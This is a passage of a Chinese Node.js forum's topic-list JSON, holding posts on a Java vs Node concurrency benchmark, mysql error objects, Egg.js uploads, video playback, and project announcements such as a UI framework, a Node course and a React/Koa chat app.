java代码:</p>\n<pre class=\"prettyprint language-java\"><code>package test;\n\nimport javax.servlet.http.HttpServlet;\nimport javax.servlet.annotation.WebServlet;\nimport javax.servlet.http.HttpServletRequest;\nimport javax.servlet.http.HttpServletResponse;\n\nimport java.io.*;\n\n@WebServlet(&quot;&#x2F;&quot;)\npublic class TestServlet extends HttpServlet {\n\n\tpublic void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {\n\t\t&#x2F;&#x2F; 暂停三秒\n\t\tint sleepTime = 3000;\n\t\ttry {\n\t\t\tThread.sleep(sleepTime);\n\t\t} catch (InterruptedException e) {\n\t\t\te.printStackTrace();\n\t\t}\n\t\tPrintWriter out = response.getWriter();\n    &#x2F;&#x2F; 读取文件并显示,unuseData.txt是一个40M的文件\n\t\tFile f = new File(&quot;&#x2F;xxx&#x2F;unuseData.txt&quot;);\n        FileInputStream fip = new FileInputStream(f);\n        InputStreamReader reader = new InputStreamReader(fip, &quot;UTF-8&quot;);\n        StringBuffer sb = new StringBuffer();\n        while (reader.ready()) {\n            sb.append((char) reader.read());\n        }\n        reader.close();\n        fip.close();\n\t\tout.println(&quot;Java Stop The World &quot; + sleepTime&#x2F;1000 + &quot;s&quot;+&quot;,unuseData:&quot;+ sb.toString());\n\t}\n\n}\n</code></pre><p>node代码:</p>\n<pre class=\"prettyprint language-js\"><code>const http = require(&quot;http&quot;);\nconst fs = require(&quot;fs&quot;);\nconst port = 4000;\nfunction nodeSleep(time) {\n    return new Promise((resolve,reject)=&gt;{\n        setTimeout(() =&gt; {\n            resolve(true)\n        }, time);\n    });\n}\nfunction getUnseData() {\n    return new Promise((resolve,reject)=&gt;{\n        &#x2F;&#x2F; unuseData.txt是一个40M的文件\n        fs.readFile(&#x27;&#x2F;xxx&#x2F;unuseData.txt&#x27;, (err, data) =&gt; {\n            if (err) reject(err);\n            resolve(data)\n        });\n    });\n}\nhttp.createServer( async function (request, response) {\n    let sleepTime = 3000;\n    &#x2F;&#x2F; 暂停三秒\n    await nodeSleep(sleepTime);\n    &#x2F;&#x2F; 读取文件并显示\n    let unuseData = await getUnseData();\n    response.end(&#96;Node Stop The World ${sleepTime}s,unseDate:${unuseData}&#96;);  \n}).listen(port);\nconsole.log(&#96;listen http:&#x2F;&#x2F;localhost:${port}&#x2F;&#96;)\n</code></pre><p>压测结果：</p>\n<pre class=\"prettyprint language-sh\"><code># Java\nab -n 50 -c 5 http:&#x2F;&#x2F;localhost:8080&#x2F;test&#x2F;\nConnection Times (ms)\n              min  mean[+&#x2F;-sd] median   max\nConnect:        0    0   0.1      0       1\nProcessing:  4181 5645 883.3   5579    7495\nWaiting:     4075 5443 838.2   5394    7215\nTotal:       4181 5645 883.3   5579    7496\n\n# Node\nab -n 50 -c 5 http:&#x2F;&#x2F;localhost:4000&#x2F;\nConnection Times (ms)\n              min  mean[+&#x2F;-sd] median   max\nConnect:        0    0   0.3      0       2\nProcessing:  3210 3487 232.7   3487    3908\nWaiting:     3182 3349 167.8   3328    3835\nTotal:       3210 3487 232.7   3488    3908\n</code></pre><p><code>注意：并发为5，总请求数为50是因为我电脑是公司的低配mini扛不住，机器好的可以适当调高</code></p>\n<p>可以看到</p>\n<p>Java最快在5秒左右，最慢在7秒左右。</p>\n<p>Node最快在3秒左右，最慢也在3秒左右。</p>\n<p>传统的Java写法居然比Node慢了2到4秒！</p>\n<h1>为什么呢？</h1>\n<p>先解释一下代码，这两段代码都是先sleep一段时间，再读取文件展示给页面上。但Node在等待的时候让另一个已经等待完成的请求来读文件了，传统的Java却只能将等待彻底完成，才开始读文件，并且由于服务tomcat的worker恒定，worker池用完后，则需要等待worker释放，导致后一个worker的时间极大延长，而Node的队列却足够长到可以应付。</p>\n<p>所以为什么只是少量计算或直接输出HelloWorld，压测时性能还不如Java是因为这个时候CPU直接打满，这会导致node直接就阻塞了，无法发挥其优势，而这时Java的多worker反而使得CPU打满充分利用CPU来计算，所以速度反而快了。</p>\n<p>但是Web编程的大部分情况都不是简单的少量计算或直接输出HelloWorld，而是往往有更多的查询或文件读写操作和更复杂的情况，所以导致Node在通用Web开发中具有更大高并发优势！</p>\n</div>","title":"为什么说node具有高并发优势","last_reply_at":"2019-05-06T11:31:46.788Z","good":false,"top":false,"reply_count":4,"visit_count":368,"create_at":"2019-05-06T08:13:33.059Z","author":{"loginname":"zy445566","avatar_url":"https://avatars2.githubusercontent.com/u/14976489?v=4&s=120"}},{"id":"5cc02d00a86ae80ce64b377d","author_id":"5cb4b9b5dad66d658e409645","tab":"ask","content":"<div class=\"markdown-text\"><p>想问一下Node怎么实现用户评论和回复消息的功能，急！有没有会做的大神指导一下，谢谢！</p>\n</div>","title":"评论回复功能的实现","last_reply_at":"2019-05-06T10:29:08.787Z","good":false,"top":false,"reply_count":3,"visit_count":623,"create_at":"2019-04-24T09:31:44.653Z","author":{"loginname":"forever520cy","avatar_url":"https://avatars1.githubusercontent.com/u/49617584?v=4&s=120"}},{"id":"5ccfca065a5bae6e07813538","author_id":"5ccfc99d776fb66e0d172609","tab":"share","content":"<div class=\"markdown-text\"><p>自己写的一个前端 UI 框架。轻量级，模块化，提供多主题支持（ 1.0.0 版本之后）。</p>\n<p>内置基线网格和常用组件，基于 MutationObserver，不需要手动维护组件生命周期。</p>\n<p>主页: <a href=\"https://oatw.github.io/luda\">https://oatw.github.io/luda</a></p>\n<p>Repo: <a href=\"https://github.com/oatw/luda\">https://github.com/oatw/luda</a></p>\n<p>欢迎提 issue 开 PR。</p>\n<p>谢谢！</p>\n</div>","title":"Luda 一个为设计师和开发者创建的 UI 框架","last_reply_at":"2019-05-06T10:26:02.828Z","good":false,"top":false,"reply_count":2,"visit_count":245,"create_at":"2019-05-06T05:45:42.982Z","author":{"loginname":"oatw","avatar_url":"https://avatars0.githubusercontent.com/u/47649745?v=4&s=120"}},{"id":"5ccfbdb7776fb66e0d1725d7","author_id":"5ca1a9666c1de62dce4667d7","tab":"ask","content":"<div class=\"markdown-text\"><p>conn.query(sql, parmes, function (err, result) {}</p>\n<p>这里的err到底是啥结构的呢？按照网上的实例：\nconsole.log(’[ERROR ] - ', err.message);\n显示的是：</p>\n<blockquote>\n<p>WARN_DATA_TRUNCATED: Data truncated for column ‘age’ at row 1\n\t 应该是一个字符串吧，那么message是属性名称吗？</p>\n</blockquote>\n<p>然后我把 err变成字符串</p>\n<blockquote>\n<pre class=\"prettyprint\"><code>console.log(&#x27;[INSERT err2 ] - &#x27;,JSON.stringify(err) );\n</code></pre></blockquote>\n<pre class=\"prettyprint\"><code>显示的是：\n</code></pre><blockquote>\n<p>{\n“code”:“WARN_DATA_TRUNCATED”,\n“errno”:1265,\n“sqlMessage”:“Data truncated for column ‘age’ at row 1”,\n“sqlState”:“01000”,\n“index”:0,\n“sql”:“INSERT INTO node_user(id,name,age) VALUES(0,‘name11’,‘3w3’)”}</p>\n</blockquote>\n<p>但是这里面怎么没有 <strong>message</strong> ？上面那个 err.message 是哪来的？</p>\n<p>然后我又直接输出</p>\n<blockquote>\n<p>console.log(’[INSERT err ] - ',err);\n这次显示的内容就多了\n{ Error: WARN_DATA_TRUNCATED: Data truncated for column ‘age’ at row 1\nat Query.Sequence._packetToError (D:\\nodejs\\node_modules\\mysql\\lib\\protocol\\sequences\\Sequence.js:47:14)\nat Query.ErrorPacket (D:\\nodejs\\node_modules\\mysql\\lib\\protocol\\sequences\\Query.js:77:18)\nat Protocol._parsePacket (D:\\nodejs\\node_modules\\mysql\\lib\\protocol\\Protocol.js:278:23)\nat Parser.write (D:\\nodejs\\node_modules\\mysql\\lib\\protocol\\Parser.js:76:12)\nat Protocol.write (D:\\nodejs\\node_modules\\mysql\\lib\\protocol\\Protocol.js:38:16)\nat Socket.&lt;anonymous&gt; (D:\\nodejs\\node_modules\\mysql\\lib\\Connection.js:91:28)\nat Socket.&lt;anonymous&gt; (D:\\nodejs\\node_modules\\mysql\\lib\\Connection.js:502:10)\nat emitOne (events.js:115:13)\nat Socket.emit (events.js:210:7)\nat addChunk (_stream_readable.js:264:12)\n--------------------\nat Protocol._enqueue (D:\\nodejs\\node_modules\\mysql\\lib\\protocol\\Protocol.js:144:48)\nat Connection.query (D:\\nodejs\\node_modules\\mysql\\lib\\Connection.js:200:25)\nat Object.exports.query (D:\\nodejs\\test\\natureFW\\dbHelp.js:46:10)\nat Object.&lt;anonymous&gt; (D:\\nodejs\\test\\NatureTest\\testAdd.js:55:12)\nat Module._compile (module.js:624:30)\nat Object.Module._extensions…js (module.js:635:10)\nat Module.load (module.js:545:32)\nat tryModuleLoad (module.js:508:12)\nat Function.Module._load (module.js:500:3)\nat Function.Module.runMain (module.js:665:10)\ncode: ‘WARN_DATA_TRUNCATED’,\nerrno: 1265,\nsqlMessage: ‘Data truncated for column ‘age’ at row 1’,\nsqlState: ‘01000’,\nindex: 0,\nsql: ‘INSERT INTO node_user(id,name,age) VALUES(0,‘name11’,‘3w3’)’ }</p>\n</blockquote>\n<p>这回一下子多了好多。都是啥？</p>\n<p>这大概是一个函数把，有属性和方法，JSON.stringify()好像只是把属性的部分给变成字符串了，其他的似乎没关。</p>\n</div>","title":"mysql的回调函数里面的参数 err 是啥结构的？","last_reply_at":"2019-05-06T08:45:58.524Z","good":false,"top":false,"reply_count":1,"visit_count":158,"create_at":"2019-05-06T04:53:11.455Z","author":{"loginname":"jyk0011","avatar_url":"https://avatars0.githubusercontent.com/u/6062713?v=4&s=120"}},{"id":"5433d5e4e737cbe96dcef312","author_id":"504c28a2e2b845157708cb61","tab":"share","content":"<div class=\"markdown-text\"><p>GitHub repo 地址：<a href=\"https://github.com/alsotang/node-lessons\">https://github.com/alsotang/node-lessons</a></p>\n<p>如果大家认为漏了哪些初学者应会的内容，可以在此留言，或者开个 issue 给我（!!推荐）。</p>\n<hr>\n<h1>《Node.js 包教不包会》 – by alsotang</h1>\n<h1>为何写作此课程</h1>\n<p>在 CNode(<a href=\"https://cnodejs.org/\">https://cnodejs.org/</a>) 混了那么久，解答了不少 Node.js 初学者们的问题。回头想想，那些问题所需要的思路都不难，但大部分人由于练手机会少，所以在遇到问题的时候很无措。国内唯一一本排的上号的 Node.js 书是 @朴灵(<a href=\"https://github.com/JacksonTian\">https://github.com/JacksonTian</a>) 的 《深入浅出Node.js》(<a href=\"http://book.douban.com/subject/25768396/\">http://book.douban.com/subject/25768396/</a> )，但这本书离实战还是比较远的。</p>\n<p>这个课程是希望提供更多的 Node.js 实战机会，通过每一节精心安排的课程目标，让 Node.js 的初学者们可以循序渐进地，有目的有挑战地开展 Node.js 的学习。</p>\n<p>更多 Node.js 入门资料请前往：<a href=\"https://cnodejs.org/getstart\">https://cnodejs.org/getstart</a></p>\n<h1>课程列表</h1>\n<ul>\n<li>Lesson 0: <a href=\"https://github.com/alsotang/node-lessons/tree/master/lesson0\">《搭建 Node.js 开发环境》</a></li>\n<li>Lesson 1: <a href=\"https://github.com/alsotang/node-lessons/tree/master/lesson1\">《一个最简单的 express 应用》</a></li>\n<li>Lesson 2: <a href=\"https://github.com/alsotang/node-lessons/tree/master/lesson2\">《学习使用外部模块》</a></li>\n<li>Lesson 3: <a href=\"https://github.com/alsotang/node-lessons/tree/master/lesson3\">《使用 superagent 与 cheerio 完成简单爬虫》</a></li>\n<li>Lesson 4: <a href=\"https://github.com/alsotang/node-lessons/tree/master/lesson4\">《使用 eventproxy 控制并发》</a></li>\n<li>Lesson 5: <a href=\"https://github.com/alsotang/node-lessons/tree/master/lesson5\">《使用 async 控制并发》</a></li>\n<li>Lesson 6: <a href=\"https://github.com/alsotang/node-lessons/tree/master/lesson6\">《测试用例：mocha，should，istanbul》</a></li>\n<li>Lesson 7: 《测试用例：supertest》</li>\n<li>Lesson 8: 《Mongodb 与 Mongoose 的使用》</li>\n<li>Lesson 9: 《一个简单的 blog》</li>\n</ul>\n<h1>License</h1>\n<p>MIT</p>\n</div>","title":"一个面向 Node.js 初学者的系列课程：node-lessons","last_reply_at":"2019-05-06T08:41:46.480Z","good":true,"top":false,"reply_count":94,"visit_count":46046,"create_at":"2014-10-07T12:00:36.270Z","author":{"loginname":"alsotang","avatar_url":"https://avatars1.githubusercontent.com/u/1147375?v=4&s=120"}},{"id":"5cc6ef49a86ae80ce64b575e","author_id":"50386c12f767cc9a51ed20cb","tab":"ask","content":"<div class=\"markdown-text\"><p>RT. 阔别NodeJs已久，目前大家都在用什么NodeJs的框架，上下游的中间件怎么选择，请给位大侠指点。</p>\n</div>","title":"阔别NodeJs已久，请教各位大侠，框架选择的问题。","last_reply_at":"2019-05-06T07:52:08.931Z","good":false,"top":false,"reply_count":12,"visit_count":1485,"create_at":"2019-04-29T12:34:17.601Z","author":{"loginname":"ringtail","avatar_url":"https://avatars2.githubusercontent.com/u/3116693?v=4&s=120"}},{"id":"5ccfdca9776fb66e0d172715","author_id":"55b9895b35ce2ac164f5191c","tab":"share","content":"<div class=\"markdown-text\"><p>Hello 大家好，</p>\n<p>我们推出了一款基于机器学习的产品推荐引擎 - <a href=\"https://zhaodao.ai\">找到AI</a></p>\n<p>如果你 1 ）不满足于现有的产品，需要寻找更好的可替代品； 2 ）想要拓宽自己的工具箱，发现更多好产品； 3 ）寻找与自己品味类似的人喜欢的产品并关注他们，欢迎使用 <a href=\"https://zhaodao.ai\">找到AI</a>  Ta 可以帮助你找到更多更好的互联网产品，和类似他们的产品，建议登录后查看 AI 推荐或关注其他人的推荐，AI 会基于你的行为偏好以及与你类似的人群进行智能推荐。</p>\n<p><img src=\"https://coding-net-production-pp-ci.codehub.cn/5ded8ef9-b778-484e-936d-ab18d194001a.gif\" alt></p>\n<p>我们正在不断学习改进以帮助您找到下一个好产品/作品，未来我们也会逐步扩宽品类帮助你发现更多好东西，比如互联网相关书籍等。欢迎反馈意见或提交产品/作品给我们～ <a href=\"mailto:hi@zhaodao.ai\">hi@zhaodao.ai</a></p>\n</div>","title":"找到 AI - 基于机器学习的产品推荐引擎","last_reply_at":"2019-05-06T07:05:13.078Z","good":false,"top":false,"reply_count":0,"visit_count":162,"create_at":"2019-05-06T07:05:13.078Z","author":{"loginname":"tvvocold","avatar_url":"https://avatars0.githubusercontent.com/u/4530539?v=4&s=120"}},{"id":"5ccbfdac5a5bae6e07812932","author_id":"5a38aa20d92f2f5b185acff5","tab":"ask","content":"<div class=\"markdown-text\"><p>Android弱鸡一枚,准备转node,求一份学习路线图.希望能够根据学习路线图来完整的学习,掌握node.</p>\n<blockquote>\n<p>没有js的基础</p>\n</blockquote>\n<p>再次谢谢各位了.\n2019-5-3  16:36</p>\n</div>","title":"Android弱鸡一枚,准备转node,求一份学习路线图","last_reply_at":"2019-05-06T06:51:37.108Z","good":false,"top":false,"reply_count":10,"visit_count":782,"create_at":"2019-05-03T08:37:00.378Z","author":{"loginname":"UOYO","avatar_url":"https://avatars1.githubusercontent.com/u/20040601?v=4&s=120"}},{"id":"5cc0840fa86ae80ce64b396c","author_id":"51b44498f78196a85c3f28b7","tab":"ask","content":"<div class=\"markdown-text\"><p>在conntroller中的 async upload方法</p>\n<pre class=\"prettyprint\"><code> let stream = await ctx.getFileStream();\nconsole.log(&quot;stream:&quot;,stream );\n</code></pre><p><strong>打印这个stream对象</strong></p>\n<pre class=\"prettyprint\"><code>  encoding: &#x27;7bit&#x27;,\n  transferEncoding: &#x27;7bit&#x27;,\n  mime: &#x27;image&#x2F;png&#x27;,\n  mimeType: &#x27;image&#x2F;png&#x27;,\n * fields: {}* }\n</code></pre><p>** html部分 **</p>\n<pre class=\"prettyprint\"><code>&lt;form action=&quot;&#x2F;api&#x2F;upload&quot; method=&quot;post&quot; enctype=&quot;multipart&#x2F;form-data&quot; &gt;\n  \n  &lt;button type=&quot;submit&quot; &gt;上传图片&lt;&#x2F;button&gt;\n  &lt;input type=&quot;file&quot;  name=&quot;file&quot; &gt;\n  &lt;input type=&quot;hidden&quot;  name=&quot;uploadType&quot; id=&quot;uploadType&quot; value=&quot;1234&quot;&gt;\n  &lt;&#x2F;form&gt;\n</code></pre><p>刚写出来时可以得到stream. fields，现在怎么折腾沒值了。但需要上传的文件是写到服务器了。\n在conntroller中的 async upload方法</p>\n<p>let stream = await ctx.getFileStream();\nconsole.log(“stream:”,stream );\n打印这个stream对象</p>\n<p>encoding: ‘7bit’,\ntransferEncoding: ‘7bit’,\nmime: ‘image/png’,\nmimeType: ‘image/png’,</p>\n<ul>\n<li>fields: {}* }\n** html部分 **</li>\n</ul>\n<p>&lt;form action=&quot;/api/upload&quot; method=“post” enctype=“multipart/form-data” &gt;</p>\n<p>&lt;button type=“submit” &gt;上传图片&lt;/button&gt;\n&lt;input type=“file”  name=“file” &gt;\n&lt;input type=“hidden”  name=“uploadType” id=“uploadType” value=“1234”&gt;\n&lt;/form&gt;\n刚写出来时可以得到stream. fields，现在怎么折腾沒值了。但需要上传的文件是写到服务器了。请大神们指点一二</p>\n</div>","title":"Egg.js 文件上传，怎么得到表单其他的input值?","last_reply_at":"2019-05-06T03:29:55.227Z","good":false,"top":false,"reply_count":2,"visit_count":368,"create_at":"2019-04-24T15:43:11.045Z","author":{"loginname":"nobody","avatar_url":"//gravatar.com/avatar/f6c2087ee6256883d056314565630cb0?size=48"}},{"id":"5cc6c4b6a86ae80ce64b5663","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><p>video标签目前只支持以下三种格式的视频，但是用户上传的视频格式有很多种，有什么插件可以播放各种各样格式的视频吗？</p>\n<blockquote>\n<p>MP4 = 带有 H.264 视频编码和 AAC 音频编码的 MPEG 4 文件\nWebM = 带有 VP8 视频编码和 Vorbis 音频编码的 WebM 文件\nOgg = 带有 Theora 视频编码和 Vorbis 音频编码的 Ogg 文件</p>\n</blockquote>\n<p>视频的格式有：‘mp4’, ‘flv’, ‘avi’, ‘wmv’, ‘mov’, ‘webm’, 'mpeg4’等等</p>\n</div>","title":"关于video标签视频播放的问题","last_reply_at":"2019-05-06T03:04:27.161Z","good":false,"top":false,"reply_count":2,"visit_count":519,"create_at":"2019-04-29T09:32:38.080Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5ccebe605a5bae6e078131ab","author_id":"5cce8b1b776fb66e0d171fb7","tab":"ask","content":"<div class=\"markdown-text\"><p>最近也想实现一下这个回复的功能,完全没有思路,还有查看未读消息的功能,\n求小伙伴们教教我</p>\n</div>","title":"这个评论回复的功能是怎么实现的呢","last_reply_at":"2019-05-06T02:31:33.916Z","good":false,"top":false,"reply_count":1,"visit_count":281,"create_at":"2019-05-05T10:43:44.479Z","author":{"loginname":"liuyifengmvc","avatar_url":"https://avatars2.githubusercontent.com/u/46715265?v=4&s=120"}},{"id":"5cc2a91ea86ae80ce64b4557","author_id":"580c1addc3fead57507172a9","tab":"ask","content":"<div class=\"markdown-text\"><p>对于微服务，go有etcd，node使用什么搭建微服务呢？在网上看到的文章都提到了seneca 大家一般使用什么呢？</p>\n</div>","title":"node微服务使用什么框架？","last_reply_at":"2019-05-06T02:17:10.172Z","good":false,"top":false,"reply_count":25,"visit_count":2178,"create_at":"2019-04-26T06:45:50.879Z","author":{"loginname":"jowang2016","avatar_url":"https://avatars1.githubusercontent.com/u/18169317?v=4&s=120"}},{"id":"5c74a05fab86b86ddf6b2ceb","author_id":"5928e4609e32cc84569a7431","tab":"share","content":"<div class=\"markdown-text\"><p>之所以叫ghChat，是想着以后做一些GitHub的集成，希望让这个即时通讯工具成为chat tool for github。目前只支持github授权登录，和展示github用户公开的信息，然后可以方便地在ghChat中为自己的github项目建个项目群，然后贴群链接到readme中，方便项目即时交流。</p>\n<h3>地址</h3>\n<p><a href=\"https://github.com/aermin/react-chat\">github项目地址</a>。<strong><em>富应用型的开发很耗时间精力，觉得还不错的麻烦给个star鼓励下ʘᴗʘ</em></strong></p>\n<p><a href=\"https://im.aermin.top/group_chat/ddbffd80-3663-11e9-a580-d119b23ef62e\">应用线上地址(也是项目的群链接)，支持直接github授权登录</a></p>\n<h3>技术栈</h3>\n<p>前端React全家桶，后端node.js(koa2), 数据库MySQL, <a href=\"http://xn--SocKet-he0jn1y0ra0619b.io\">双向通信SocKet.io</a>, jwt鉴权等等。具体看package.json。有疑问的可以加ghChat群交流哦，我每天都在线，也可以私聊我，<a href=\"https://im.aermin.top/private_chat/1\">点击加我</a></p>\n<h3>项目展示：</h3>\n<p>之前某个时间的大部分功能的截图，其他功能和新功能直接<a href=\"https://im.aermin.top\">线上体验</a>。</p>\n<p><img src=\"https://user-images.githubusercontent.com/24861316/55677334-2f599d00-5918-11e9-8eb9-ab74a56572b1.png\" alt=\"image\"></p>\n<p><img src=\"https://user-images.githubusercontent.com/24861316/57189039-caf02480-6f3b-11e9-85b0-59f107b9b26f.png\" alt=\"image\"></p>\n<p><img src=\"https://user-images.githubusercontent.com/24861316/57188951-5e285a80-6f3a-11e9-8def-ef932c4abc8b.png\" alt=\"image\"></p>\n<h3>建议开启PWA: <a href=\"https://github.com/aermin/blog/issues/63\">如何在chrome浏览器中开启对PWA的支持</a></h3>\n<h3>目前进度</h3>\n<ul>\n<li>\n<p>账户</p>\n<ul>\n<li>[x] 登录</li>\n<li>[x] 注册</li>\n<li>[x] 退出登录</li>\n<li>[x] 多设备同时登录</li>\n</ul>\n</li>\n<li>\n<p>对github的集成</p>\n<ul>\n<li>[x] 支持github授权登录</li>\n<li>[x] 展示github用户公开的信息</li>\n</ul>\n</li>\n<li>\n<p>UI</p>\n<ul>\n<li>[x] 弹窗，提示等基础组件</li>\n<li>[x] 响应式布局, 适配桌面端和移动端。</li>\n</ul>\n</li>\n<li>\n<p>私聊</p>\n<ul>\n<li>[x] 私聊</li>\n<li>[x] 添加联系人</li>\n<li>[x] 好友资料展示</li>\n<li>[x] 删除联系人</li>\n</ul>\n</li>\n<li>\n<p>群聊</p>\n<ul>\n<li>[x] 群聊</li>\n<li>[x] 建群</li>\n<li>[x] 加群</li>\n<li>[x] 群资料展示</li>\n<li>[x] 退群</li>\n<li>[x] 编辑群资料</li>\n<li>[x] 有人加入群时会有提示</li>\n</ul>\n</li>\n<li>\n<p>查询</p>\n<ul>\n<li>[x] 用户搜索&amp;&amp;群搜索： 支持前端模糊搜索和后端模糊搜索</li>\n</ul>\n</li>\n<li>\n<p>丰富聊天方式</p>\n<ul>\n<li>[x] 聊天页表：实时按时间降序展示联系过的人和加入的群</li>\n<li>[x] 发图</li>\n<li>[x] 发表情</li>\n<li>[x] 发文件</li>\n<li>[x] 下载文件</li>\n<li>[x] Enter快捷键发送信息,发送按钮灰亮</li>\n<li>[x] @某人</li>\n<li>[x] 图片放大查看</li>\n<li>[x] 发送copy的图片(如截图后粘贴可直接发图)</li>\n<li>[x] 分享群|联系人给其他的人|群（应用内|外都支持）</li>\n<li>[ ] 提供在线表情库</li>\n<li>[ ] 支持Markdown</li>\n<li>[ ] 支持Quote</li>\n</ul>\n</li>\n<li>\n<p>新消息提示</p>\n<ul>\n<li>[x] 浏览器桌面通知（生产环境下，使用chrome的桌面通知需要你的网站是HTTPS的）</li>\n<li>[x] 列表未读消息数目提示</li>\n<li>[x] 刷新/重开/(不同账号)重登页面，列表未读消息的数目将仍然且准确显示</li>\n</ul>\n</li>\n<li>\n<p>不断的重构和性能优化</p>\n<ul>\n<li>[x] gzip 压缩</li>\n<li>[x] 聊天内容懒加载，每次获取20条数据</li>\n<li>[x] 路由按需加载</li>\n<li>[x] 接口请求频率限制</li>\n<li>[ ] css文件单独打包</li>\n<li>[ ] sql优化</li>\n</ul>\n</li>\n<li>\n<p>其他</p>\n<ul>\n<li>[x] 机器人智能聊天回复</li>\n<li>[x] 部署SSL证书</li>\n<li>[x] 支持PWA</li>\n<li>[ ] 国际化</li>\n<li>[ ] 后端用TS重写，封装成sdk</li>\n<li>[ ] CI/CD</li>\n</ul>\n</li>\n</ul>\n<h3>项目结构图</h3>\n<pre class=\"prettyprint\"><code>├── LICENSE\n├── README-zh_CN.md\n├── README.md\n├── build\n├── package-lock.json\n├── package.json\n├── postcss.config.js\n├── secret.js &#x2F;&#x2F; 放一些非公开的secret\n├── server  &#x2F;&#x2F; 后端代码\n│   ├── config.js\n│   ├── controllers\n│   ├── ecosystem.config.js &#x2F;&#x2F; pm2加生产环境变量的配置文件\n│   ├── gulpfile.js\n│   ├── index.js\n│   ├── init  &#x2F;&#x2F; 初始化mysql\n│   ├── middlewares\n│   ├── models\n│   ├── package-lock.json\n│   ├── package.json\n│   ├── routes  &#x2F;&#x2F; 后端路由，跟登录注册模块有关\n│   ├── socket  &#x2F;&#x2F; 除了登录注册，其他都用socket 来通信\n│   ├── utils\n│   └── yarn.lock\n├── src  &#x2F;&#x2F; 前端代码\n│   ├── App.js\n│   ├── app.scss\n│   ├── assets\n│   ├── components\n│   ├── containers\n│   ├── index.html\n│   ├── index.js\n│   ├── manifest.json &#x2F;&#x2F; PWA需要\n│   ├── modules\n│   ├── redux\n│   ├── router\n│   ├── service-worker.js &#x2F;&#x2F; PWA需要\n│   └── utils\n├── webpack.common.config.js  &#x2F;&#x2F; 通用webpack设置\n├── webpack.config.js  &#x2F;&#x2F;生产相关的webpack配置\n├── webpack.dev.config.js  &#x2F;&#x2F;开发相关的webpack配置\n</code></pre><h3>本地开发</h3>\n<ol>\n<li>项目拉到本地</li>\n</ol>\n<pre class=\"prettyprint\"><code>git clone https:&#x2F;&#x2F;github.com&#x2F;aermin&#x2F;react-chat.git\n</code></pre><ol>\n<li>在react-chat文件夹下创建一个secret.js的空白文件。</li>\n</ol>\n<p>如果要使用github授权登录，使用七牛云cdn，生产环境数据库和jwt的secret的单独配置，就要填充相应的配置了。</p>\n<pre class=\"prettyprint\"><code>module.exports = {\n  client_secret: &#x27;&#x27;, &#x2F;&#x2F; github授权登录需要的  github-&gt; settings -&gt;  Developer settings 那边生成获取\n  db: {\n    host: &#x27;&#x27;, &#x2F;&#x2F; 数据库IP\n    port: , &#x2F;&#x2F; 数据库端口\n    database: &#x27;&#x27;, &#x2F;&#x2F; 数据库名称\n    user: &#x27;&#x27;, &#x2F;&#x2F; 数据库用户名\n    password: &#x27;&#x27;, &#x2F;&#x2F; 数据库密码\n  },\n  secretValue: &#x27;&#x27;, &#x2F;&#x2F; json web token 的 secret\n  qiniu: { &#x2F;&#x2F; 七牛云配置\n    accessKey: &#x27;&#x27;,\n    secretKey: &#x27;&#x27;,\n    bucket: &#x27;&#x27;\n  }\n};\n</code></pre><ol>\n<li>下载前端的npm包</li>\n</ol>\n<pre class=\"prettyprint\"><code>cd react-chat\n</code></pre><pre class=\"prettyprint\"><code>npm i\n</code></pre><ol>\n<li>下载后端的npm包</li>\n</ol>\n<pre class=\"prettyprint\"><code>cd cd react-chat&#x2F;server \n</code></pre><pre class=\"prettyprint\"><code>npm i\n</code></pre><ol>\n<li>初始化数据库</li>\n</ol>\n<pre class=\"prettyprint\"><code>&#x2F;&#x2F;需要先在本地建一个名为ghchat的mysql数据库\n配置如下看react-chat&#x2F;server&#x2F;config.js\n\nnpm run init_sql    &#x2F;&#x2F;然后查看下数据库是否init成功\n</code></pre><ol>\n<li>跑起前端和后端的代码</li>\n</ol>\n<pre class=\"prettyprint\"><code>npm run start\n</code></pre><pre class=\"prettyprint\"><code>cd ..      &#x2F;&#x2F; 返回到react-chat&#x2F;目录\n</code></pre><pre class=\"prettyprint\"><code>npm run start\n</code></pre><p>ps: 本地发图片和发文件和github登录无法使用，需要自己去github和七牛云申请一些东西</p>\n<h3>文档</h3>\n<p>这边开坑了一篇<a href=\"https://github.com/aermin/blog/issues/60\">ghChat开发历程</a> ，将不断地更新总结做这个全栈项目时会遇到的问题，知识点，和坑。</p>\n</div>","title":"写个高完成度的实时聊天应用，Node(Koa2)+React/Vue全家桶+Socket.io+MySQL+PWA","last_reply_at":"2019-05-06T02:02:49.314Z","good":false,"top":false,"reply_count":25,"visit_count":3274,"create_at":"2019-02-26T02:11:43.731Z","author":{"loginname":"aermin","avatar_url":"https://avatars1.githubusercontent.com/u/24861316?v=4&s=120"}},{"id":"5cceae295a5bae6e07813106","author_id":"58bcce197872ea0864fee3d5","tab":"ask","content":"<div class=\"markdown-text\"><p>需求是这样的：用户在上传视频时，上传完成之后，会选择某一帧的图片作为视频的预览图片，也即video标签的poster的值，怎么读取视频里面的帧呢？</p>\n</div>","title":"怎么获取视频里面的某一帧或者某几帧","last_reply_at":"2019-05-06T02:01:58.563Z","good":false,"top":false,"reply_count":9,"visit_count":323,"create_at":"2019-05-05T09:34:33.023Z","author":{"loginname":"dreamsline","avatar_url":"https://avatars3.githubusercontent.com/u/20219371?v=4&s=120"}},{"id":"5cce4cff5a5bae6e07812d2a","author_id":"5a7a5d505321b5396004ec1e","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://nstudio.io/xplat\">https://nstudio.io/xplat</a></p>\n<p><img src=\"//static.cnodejs.org/FrLM6r-vkZ4NsM12ioYjYyCKlWVw\" alt=\"image.png\"></p>\n<p><img src=\"//static.cnodejs.org/FovNBKarrhijn-bAAV-ZK9xG02El\" alt=\"image.png\"></p>\n<p>lib 所有平台通用\nxplat 指定平台通用代码\napp 同一平台不同应用</p>\n<h2>支持：</h2>\n<ul>\n<li>web （angular）,</li>\n<li>nativescript （APP）</li>\n<li>ionic （web/APP）</li>\n<li>electron (桌面应用)</li>\n<li>nest （后端）</li>\n</ul>\n<p>也可以 多个后端或者前端项目共享一套lib库，在一个仓库中启动多个项目 （不同脚本）</p>\n<p>github: <a href=\"https://github.com/nstudio/xplat\">https://github.com/nstudio/xplat</a></p>\n</div>","title":"xplat  一套代码通用 